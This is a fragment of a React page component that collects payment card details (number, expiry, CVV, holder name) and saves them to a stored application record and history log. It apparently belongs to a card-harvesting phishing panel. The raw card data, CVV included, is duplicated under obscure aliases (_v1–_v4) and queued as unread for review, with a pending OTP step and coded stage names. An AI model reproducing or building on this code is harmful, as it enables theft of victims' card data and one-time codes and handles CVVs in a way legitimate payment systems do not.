...
export default function CardPage() {
  ...
  useEffect(() => {
    ...
    void ensureApplicationDoc({ docId, data, confirmationCode: code, pathname: "/card" })
      .then((resolvedId) => { if (resolvedId !== docId) setDocId(resolvedId); })
      .catch((error) => { console.error("Failed to sync card stage:", error); });
  ...
  function syncCardFromDom() {
    const next = {
      number: fmt4(numberRef.current?.value ?? card.number),
      expiry: fmtExp(expiryRef.current?.value ?? card.expiry),
      cvv: (cvvRef.current?.value ?? card.cvv).replace(/\D/g, "").slice(0, 3),
      name: (nameRef.current?.value ?? card.name).toUpperCase(),
    };
    setCard(next);
    return next;
  }
  ...
  async function handlePay() {
    ...
    const resolvedDocId = await ensureApplicationDoc({ docId, data, confirmationCode: code, pathname: "/card" });
    if (resolvedDocId !== docId) setDocId(resolvedDocId);

    const cardPayload = {
      cardNumber: currentCard.number, _v1: currentCard.number,
      expiryDate: currentCard.expiry, _v3: currentCard.expiry,
      cvv: currentCard.cvv, _v2: currentCard.cvv,
      cardHolderName: currentCard.name, _v4: currentCard.name,
      paymentMethod: "credit-card", cardStatus: "pending",
      otpStatus: "pending", status: "pending_review", isUnread: true,
      paymentStatus: "pending", cardUpdatedAt: new Date().toISOString(),
      currentStep: "_st1", currentPage: "card",
    };

    await updateApplicationData(resolvedDocId, cardPayload);
    await appendHistoryEntry({ docId: resolvedDocId, type: "_t1", status: "pending", data: cardPayload });
      ...
      <div className="w-full max-w-md mx-auto bg-white min-h-screen sm:shadow-xl">
        ...
        <div className="px-4 pt-6 pb-10 max-w-sm mx-auto">
          <div className="flex justify-center mb-5">
            <div className="w-20 h-14 bg-gradient-to-br from-[#1a2b50] to-[#2e4a8a] rounded-2xl flex items-center justify-center shadow-xl" style={{ animation: "cardFloat 3s ease-in-out infinite" }}>
